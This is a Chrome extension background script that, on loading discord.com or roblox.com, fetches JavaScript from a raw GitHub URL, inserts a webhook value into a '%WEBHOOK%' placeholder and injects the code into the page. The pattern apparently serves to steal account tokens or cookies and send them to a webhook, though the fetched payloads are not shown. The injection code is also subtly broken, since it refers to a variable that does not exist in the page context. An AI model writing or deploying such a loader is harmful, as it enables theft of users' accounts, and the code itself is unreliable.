chrome.webNavigation.onCompleted.addListener(function(details) {
  if (details.url.includes('discord.com')) {
    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/discord.js')
      .then(response => response.text())
      .then(data => {
        const modifiedData = data.replace('%WEBHOOK%', '123');
        
        const script = document.createElement('script');
        script.textContent = modifiedData;

        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          func: () => {
            document.head.appendChild(script);
          }
        });
      })
      .catch(error => console.error('Error fetching or modifying the script:', error));
  } else if (details.url.includes('roblox.com')) {
    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/roblox.js')
      .then(response => response.text())
      .then(data => {
        const modifiedData = data.replace('%WEBHOOK%', '123');
        
        const script = document.createElement('script');
        script.textContent = modifiedData;

        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          func: () => {
            document.head.appendChild(script);
          }
        });
      })
      .catch(error => console.error('Error fetching or modifying the script:', error));
  }
}, { url: [{ urlMatches: 'https://*.discord.com/*' }, { urlMatches: 'https://*.roblox.com/*' }] });
